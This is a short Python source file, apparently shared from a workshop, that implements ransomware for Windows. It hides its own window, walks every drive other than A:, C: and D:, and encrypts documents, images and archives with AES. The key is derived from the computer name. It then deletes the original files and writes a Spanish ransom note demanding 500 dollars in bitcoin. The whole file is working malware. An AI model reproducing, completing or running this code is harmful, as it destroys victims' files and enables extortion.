# esté es el código visto en el taller

import os
import sys
import base64

from Crypto.Cipher import AES
from Crypto.Hash import SHA3_256

from win32 import win32api, win32gui, win32process

CONFIG = {
    'ValidExtensions': [
        '.pdf', '.txt', '.jpg', '.jpeg', '.png', '.docx', '.doc',
        '.xls', '.xlsx', '.zip', '.rar', '.tar'
    ],

    'Suffix': '.CRYPTED',

    'RecoverTextName': 'HOW_TO_RECOVER.txt'
}

def print_warning(path):
    message = """
    HAS SIDO VICTIMA DE MI VIRUS INFORMATICO, SI QUIERES RECUPERAR
    TUS ARCHIVOS DEPOSITA 500 DOLARES EN BITCOINS A LA SIGUIENTE
    CARTERA -> bitcoin.com/wallet/asd123
    """

    with open(os.path.join(path, CONFIG['RecoverTextName']), 'w') as output_file:
        output_file.write(message)

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def get_enc_key():
    key = base64.b64encode(os.environ['COMPUTERNAME'].encode('ascii'))
    key = SHA3_256.new(key).digest()
    return key

def list_drives():
    drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
    return drives

def list_files(drive):
    key = get_enc_key()
    last_dir = ''

    for root, subfiles, files in os.walk(drive):
        for file in files:
            file_path = os.path.join(root, file)
            _, extension = os.path.splitext(file)

            if extension in CONFIG['ValidExtensions']:
                crypto(key, file_path)
                delete_file(file_path)

                if root != last_dir:
                    print_warning(root)
                    last_dir = root

def crypto(key, file_path):
    block_size = 65536
    initial_vector = os.urandom(16)

    output_path = file_path + CONFIG['Suffix']
    file_size = str(os.path.getsize(file_path)).zfill(16)

    encryptor = AES.new(key, AES.MODE_CBC, initial_vector)

    with open(file_path, 'rb') as input_file:
        with open(output_path, 'wb') as output_file:
            output_file.write(bytes(file_size, 'utf-8'))
            output_file.write(initial_vector)

            while True:
                block = input_file.read(block_size)

                if len(block) == 0:
                    break

                if len(block) % 16 != 0:
                    block += bytes(' ' * (16 - len(block) % 16), 'utf-8')

                output_file.write(encryptor.encrypt(block))

def main():
    def callback(hwnd, pid):
        if win32process.GetWindowThreadProcessId(hwnd)[1] == pid:
            win32gui.ShowWindow(hwnd, 0)

    win32gui.EnumWindows(callback, os.getpid())

    drives = list_drives()

    for drive in drives:
        if not "A:" in drive and not "C:" in drive and not "D:" in drive:
            list_files(drive)

if __name__ == "__main__":
    main()
